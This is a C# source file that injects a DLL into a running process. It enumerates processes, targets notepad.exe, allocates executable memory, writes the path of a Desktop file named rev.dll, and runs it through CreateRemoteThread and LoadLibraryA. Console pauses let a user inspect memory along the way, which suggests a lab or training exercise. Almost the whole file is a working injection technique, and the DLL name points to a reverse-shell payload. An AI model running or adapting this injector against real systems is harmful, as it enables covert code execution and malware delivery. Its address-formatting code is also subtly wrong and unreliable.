using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;

namespace Inject
{

    class Program
    {
        public struct ProcessEntry32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szExeFile;
        };

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll")]
        static extern int Process32First(IntPtr hSnapshot, ref ProcessEntry32 lppe);

        [DllImport("kernel32.dll")]
        static extern int Process32Next(IntPtr hSnapshot, ref ProcessEntry32 lppe);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        public static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo);
       
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);


        static void Main(string[] args)
        {
            IntPtr SnapShot = CreateToolhelp32Snapshot(0x00000002, 0); //2 = SNAPSHOT of all procs
            ProcessEntry32 pe32 = new ProcessEntry32();
            pe32.dwSize = (uint)Marshal.SizeOf(pe32);

            // Retrieve all the processes.
            while (Process32Next(SnapShot, ref pe32) != 0)
            {
                if (pe32.szExeFile == "notepad.exe")
                {
                    IntPtr hProcess = default;
                    int processID = (int)pe32.th32ProcessID;
                    hProcess = OpenProcess(0x001F0FFF, false, processID);

                    //Allocate space
                    IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

                    var allocAddress = string.Format("{0:X}", addr); // Pointer -> String
                    UInt64 number = UInt64.Parse(allocAddress); // String -> Int
                    string allocAddressHex = number.ToString("x"); // Int -> Hex
                    Console.WriteLine("Executable Memory Address (VirtualAllocEx) to remote processID-> " + processID + " on Mem.Address ->" + "0x" + allocAddressHex);

                    Console.WriteLine("\n");
                    Console.WriteLine("1st breakpoint. Examine the memory address of the process and press Enter to continue ...");
                    Console.ReadLine();
                    IntPtr outSize;

                    //Write to remote process
                    String dir = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                    String dllName = dir + "\\rev.dll";
                    WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
                    IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

                    var dllAddress = string.Format("{0:X}", addr); // Pointer -> String
                    UInt64 dllnumber = UInt64.Parse(dllAddress); // String -> Int
                    string dllAddressHex = number.ToString("x"); // Int -> Hex
                    Console.WriteLine($"[+] The Address of the Loaded DLL is 0x{dllAddressHex}");
                    Console.WriteLine("2st breakpoint. Examine the memory address of the process and press Enter to continue ...");
                    Console.ReadLine();

                    //Enumerate the threads of the remote process before creating a new one.
                    List<int> threadList = new List<int>();
                    ProcessThreadCollection threadsBefore = Process.GetProcessById(processID).Threads;
                    foreach (ProcessThread thread in threadsBefore)
                    {
                        threadList.Add(thread.Id);
                    }

                    //Create a remote thread and execute it
                    IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
                    //Enumerate threads from the given process.
                    ProcessThreadCollection threads = Process.GetProcessById(processID).Threads;
                    foreach (ProcessThread thread in threads)
                    {
                        if (!threadList.Contains(thread.Id))
                        {
                            Console.WriteLine("Start Time:" + thread.StartTime + " Thread ID:" + thread.Id + " Thread State:" + thread.ThreadState);
                        }

                    }


                }

            }

        }
    }
}

